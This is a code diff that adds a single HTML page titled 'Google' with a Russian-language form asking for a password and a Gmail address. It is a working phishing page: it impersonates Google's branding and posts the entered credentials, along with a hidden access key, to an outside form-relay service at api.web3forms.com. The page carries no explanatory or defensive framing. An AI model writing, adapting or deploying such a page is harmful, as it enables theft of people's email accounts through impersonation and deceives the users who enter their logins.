@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <link rel="icon" href="class_favicon_1.png" type="image/x-icon">
+    <style>
+        body {
+            background:#333 url('../png_jpg_jpeg/class_picture_3.jpg') center no-repeat;
+            display:flex;
+            justify-content:center;
+            align-items: center;
+            height:100vh;
+        }
+        @font-face {
+            font-family:is_1;
+            src:url('../font/class_font_2.ttf');
+        }
+        form {
+            width:500px;
+            height:400px;
+        }
+        .class_input_1,.class_input_2,.class_input_3 {
+            height:150px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            align-content: space-evenly;
+            padding:0px 20px;
+            box-sizing: border-box;
+        }
+        .class_input_1,.class_input_2,.class_input_3 div {
+            font-size:25px;
+            font-family:Impact,sans-serif;
+            font-style:italic;
+            word-spacing:5px;
+            letter-spacing:1px;
+        }
+        .class_input_3 button {
+            padding:10px 20px;
+            border-radius:10px;
+            font-size:16px;
+            font-weight:bold;
+            background-color:green;
+        }
+        input {
+            margin-left:10px;
+            flex-grow:1;
+            outline:none;
+            border-radius:10px;
+            height:20px;
+        }
+        .class_input_1 {
+        }
+        .class_input_2 {
+        }
+        .class_input_3 {
+            height:100px;
+        }
+    </style>
+</head>
+<body>
+    <form action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="44f607c8-587a-4dbd-9ce3-6f29088ed330">
+        <div class="class_input_1">
+             <div>Введите password</div>
+            <input type="password" name="password">
+        </div>
+        <div class="class_input_2">
+            <div>Введите Gmail</div>
+            <input type="email" name="Gmail">
+        </div>
+        <div class="class_input_3">
+            <button type="submit"><span>Отправить</span></button>
+        </div>
+    </form>
+</body>
+</html>
